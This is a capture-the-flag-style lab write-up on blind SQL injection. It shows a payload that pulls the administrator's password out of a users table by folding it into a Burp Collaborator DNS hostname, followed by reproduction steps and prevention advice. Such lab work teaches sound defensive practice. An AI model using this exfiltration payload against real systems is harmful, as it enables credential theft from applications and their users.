# 🔐 Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration

## 🧩 Objective
To extract sensitive data (administrator password) using out-of-band SQL Injection techniques.

## 🔍 Vulnerability
The application is vulnerable to SQL Injection but does not provide visible output, errors, or timing differences. Data must be exfiltrated using external channels.

## ⚙️ Payload Used
'|| (SELECT password FROM users WHERE username='administrator') ||'.burpcollaborator.net--

## 🔎 Analysis
1. Traditional SQL Injection methods do not reveal data  
2. Use out-of-band (OAST) technique  
3. Database sends DNS/HTTP request containing sensitive data  
4. Capture interaction using Burp Collaborator  
5. Extract password from interaction logs  

## 🚀 Steps to Reproduce
1. Open Burp Suite and go to Collaborator  
2. Generate a unique Collaborator domain  
3. Navigate to the vulnerable application  
4. Intercept request using Burp Suite  
5. Inject payload:
   '|| (SELECT password FROM users WHERE username='administrator') ||'.burpcollaborator.net--
6. Send the request  
7. Monitor Collaborator interactions  
8. Identify DNS/HTTP request containing password
9. Steps to use Burp Collaberator
    - Go to Burp
      - -> Burp collaberator client
        - copy to clipboard
    - Check the cheatsheet -> DNS lookup -> try different database
    - Click on pullnow
      - check DNS lookup

## ✅ Result
Successfully extracted the administrator password via out-of-band DNS interaction.

## 🧠 Key Learning
Out-of-band SQL Injection enables data exfiltration even when no direct response, error, or delay is observable.

## 🛡️ Prevention
- Use parameterized queries (prepared statements)  
- Restrict outbound network access from database  
- Monitor DNS/HTTP traffic for anomalies  
- Implement strict input validation  
